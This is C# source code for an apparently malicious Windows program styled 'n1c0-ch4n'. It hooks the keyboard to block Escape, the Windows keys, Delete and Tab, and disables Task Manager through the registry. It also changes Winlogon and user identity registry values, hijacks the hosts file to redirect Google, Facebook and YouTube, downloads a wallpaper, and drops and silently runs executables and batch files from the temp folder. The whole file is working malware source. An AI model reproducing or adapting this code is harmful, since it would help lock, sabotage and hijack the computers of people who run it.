using System;
using System.Windows;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Windows.Controls;
using System.Diagnostics;
using System.Security.Principal;
using System.DirectoryServices.AccountManagement;
using keyhook;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;
using System.Net;

namespace n1c0_ch4n
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            fuckoff1time();
            ed1th0st();
            globalKeyboardHook gkh = new globalKeyboardHook();
            gkh.HookedKeys.Add(Keys.Escape);
            gkh.HookedKeys.Add(Keys.LWin);
            gkh.HookedKeys.Add(Keys.RWin);
            gkh.HookedKeys.Add(Keys.Delete);
            gkh.HookedKeys.Add(Keys.Tab);

            gkh.KeyDown += new KeyEventHandler(handlekey);
            gkh.hook();

            gr33ntii();
            InitializeComponent();
            //UserPrincipal.Current.Sid

        }
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        string backgroundImageUrl = "https://pbs.twimg.com/media/C5Jh1FwUoAAbf4E.jpg"; //desktop background picture
        string userDir = "C:\\Users\\";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();

        private void handlekey(object sender, KeyEventArgs e)
        {
            e.Handled = true;
        }

        private void k3yd0wn(object sender, System.Windows.Input.KeyEventArgs e)
        {
            e.Handled = true;
        }
        public void singtale()
        {
            string userDir = null;
            string userName = null;
            string backgroundImageUrl = null;
        }

        private void SetWallpaperFromWeb(string url, string path)
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile(new Uri(url), path);
            SetWallpaper(path);
        }
        //setbackground 
        public void SetWallpaper(String path)
        {
            SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
        }

        public void gr33ntii()
        {
            string backgroundImageName = userDir + userName + "\\0x00000x000x0x0x0x0x0x0x0x0x0.jpg";
            SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
            var user = WindowsIdentity.GetCurrent().User;
            string sid = UserPrincipal.Current.Sid.ToString();
            string temp = System.IO.Path.GetTempPath();
            System.IO.File.WriteAllBytes(temp + "icon.ico", Properties.Resources.ic04t3xt);

            RegistryKey editkey;
            //play with registry xd
            editkey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
            editkey.SetValue("", temp + "icon.ico");
            editkey.Close();

            editkey = Registry.ClassesRoot.CreateSubKey(@"Control Panel\Desktop");
            editkey.SetValue("Wallpaper", "");
            editkey.Close();

            editkey = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            editkey.SetValue("DisableTaskMgr", "1");
            editkey.Close();

            editkey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
            editkey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
            editkey.Close();

            editkey = Registry.Users.CreateSubKey(UserPrincipal.Current.Sid + "\\Volatile Environment\\");
            editkey.SetValue("USERNAME", "Nico Nico", RegistryValueKind.String);
            editkey.Close();


            editkey = Registry.Users.CreateSubKey(UserPrincipal.Current.Sid + "\\Volatile Environment\\");
            editkey.SetValue("USERDOMAIN", "Nico Nico", RegistryValueKind.String);
            editkey.Close();

            editkey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\DataStore\" + UserPrincipal.Current.Sid + "\0");
            editkey.SetValue("szTargetName", "Nico Nico", RegistryValueKind.String);
            editkey.Close();

            editkey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\DataStore\" + UserPrincipal.Current.Sid + "\0");
            editkey.SetValue("szName", "Nico Nico", RegistryValueKind.String);
            editkey.Close();

            editkey = Registry.CurrentUser.CreateSubKey(@"Volatile Environment");
            editkey.SetValue("USERNAME", "Nico Nico", RegistryValueKind.String);
            editkey.SetValue("USERDOMAIN", "Nico Nico", RegistryValueKind.String);
            editkey.SetValue("LOGONSERVER", "\\Nico Nico", RegistryValueKind.String);
            editkey.SetValue("USERDOMAIN_ROAMINGPROFILE", "\\Nico Nico", RegistryValueKind.String);
            editkey.Close();



            System.IO.File.WriteAllBytes(temp + "text.txt", Properties.Resources.txt);
            System.IO.File.WriteAllBytes(temp + "fuckoff.bat", Properties.Resources.fuckoff);
            System.IO.File.WriteAllBytes(temp + "readme.docx", Properties.Resources.readme);
            System.IO.File.WriteAllBytes(temp + "b0x0fd34th.exe", Properties.Resources.b0x0fd34th);

            ProcessStartInfo psi = new ProcessStartInfo(temp + "windl.bat");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);

        }
         public void fuckoff1time()
        {
            foreach (var process in Process.GetProcessesByName("n1c0-ch4n"))
            {
                process.Kill();
            }

        }

        private void MME_ME(object sender, RoutedEventArgs e)
        {
            MediaElement i = sender as MediaElement;
            i.Position = TimeSpan.FromMilliseconds(1);
        }
        private void mp4_loaded(object sender, RoutedEventArgs e)
        {
            string videopath = System.IO.Path.GetTempPath() + "ch9number1.mp4";
            System.IO.File.WriteAllBytes(videopath, Properties.Resources.gr33ntii);
            mp4.Source = new System.Uri(videopath);
        }

        private void ed1th0st()
        {
            string texttowrite = "\ngr33ntii.moe/[INFECTED]/         google.com google.vn google.ca facebook.com facebook.vn youtube.com youtube.vn";
            string text = System.IO.File.ReadAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts"), Encoding.UTF8);
            if (!text.Contains(texttowrite))
            {
                using (StreamWriter w = System.IO.File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers/etc/hosts")))
                {
                    w.WriteLine(texttowrite);
                }
            }
        }
    }
}
        

